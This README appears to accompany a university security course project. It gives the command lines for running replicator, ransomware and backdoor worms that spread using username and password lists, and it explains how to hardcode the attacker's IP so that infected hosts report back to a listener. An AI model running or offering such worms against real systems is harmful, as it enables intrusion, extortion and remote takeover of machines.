Setup:
    Attacker system  :  davidposs-Lubuntu-1
    Directory in VM  :  /home/cpsc/Project1


Instructions: 
    Replicator Worm:
        $ python replicator.py usernames.txt passwords.txt

    Ransom Worm
        $ python replicator.py local_ransom.py usernames.txt passwords.txt

    Backdoor Worm
        Optional first step: creates a listener for victims sending their
           IPs to the attacker. Run the second command in a new tab.
        (optional)  $ python recv.py
        $ python replicator.py local_backdoor.py usernames.txt passwords.txt

Notes:
       In SSHConnection.py, the first line should have the ATTACKER'S
       IP address hardcoded in. This is needed for the backdoor worm to
       work. The thought was that we needed to forward the attacker's IP
       through the network to each system, and this was the simplest way
       without sending another file through.
       Throughout testing, the attacker system's IP has been 192.168.1.4

       Unfortunately username and password files must be named usernames.txt
       and passwords.txt respectively

       All necessary files are provided. 
       All files must be in the same directory.
